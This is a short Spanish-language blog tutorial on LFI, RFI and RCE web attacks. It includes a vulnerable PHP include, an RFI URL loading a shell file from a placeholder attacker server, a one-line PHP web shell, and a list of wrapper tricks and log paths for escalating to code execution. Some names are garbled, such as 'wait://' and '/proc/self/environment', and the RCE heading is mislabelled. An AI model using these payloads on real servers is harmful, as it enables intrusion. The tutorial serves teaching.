---
layout: post
title:  "Aprendiendo a identificar los diferentes ataques basicos a nivel Web"
description: Aprendiendo sobre las Vulnerabilidades " LFI // RFI // RCE "
tags: Web Attacks
---
Empezaremos por aprender las principales Vulnerabilidades a nivel Web
  
# ~ LFI ~   Local File Inclusion


1.- La vulnerabilidad de Local File Inclusion se produce como consecuencia de un fallo en la programación de la página, filtrando inadecuadamente lo que se incluye al usar funciones en PHP para incluir archivos.
Para poder corroborar si un sitio es vulnerable, se puede colocar un valor ilógico a la variable. 
En nuestro ejemplo tenemos: "http://localhost/index.php?page=" donde se coloca un valor, en este caso http://localhost/index.php?page=78se3, algo aleatorio que no se encuentre registrado.
Si arroja un error como Warning: main()… o Warning: include()… o similar entonces es probable que sea vulnerable a RFI o LFI

~ Archivo vulnerable de php mediante LFI ~ 
{% highlight php %}
<?php
include $_GET[‘pagina’];
?>
{% endhighlight %}

# ~ RFI ~   Remote File Inclusion
La vulnerabilidad de Remote File Inclusion se produce cuando:
Una página vulnerable que presente un aspecto similar a este en su URL:   " http://[servidor_victima]/index.php?page=plantilla.html "
El atacante (Nosotros) podriamos obtener una Shell en el servidor vulnerable mediante lo siguiente:
http://[servidor_victima]/index.php?page=http://[servidor_atacante]/shell.txt&&cmd=ls

Pudiendo contener el archivo shell.txt cualquier código, por ejemplo:
{% highlight php %} 
<?php
  system($cmd);
?>
{% endhighlight %}

# ~ RCE ~   Remote File Inclusion
Algunas formas comunes de pasar de un LFI a RCE:
Ahora, por lo general, cuando encuentro una inclusión de archivo local o LFI, primero trato de convertirlo en una ejecución remota de código.

> Trucos para convertir su LFI en RCE, como:
-Uso de formularios / funciones de carga de archivos:
---
Usando el contenedor de PHP  wait: // comando
Usando el archivo PHP wrapper  php: //
Usando el contenedor PHP  php: // filter
Usando PHP      input: // stream
Usando datos: // texto / plano; base64, comando
Usando / proc / self / environment
Usando / proc / self / fd
---
>Las siguientes Rutas importantes:
---
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
---
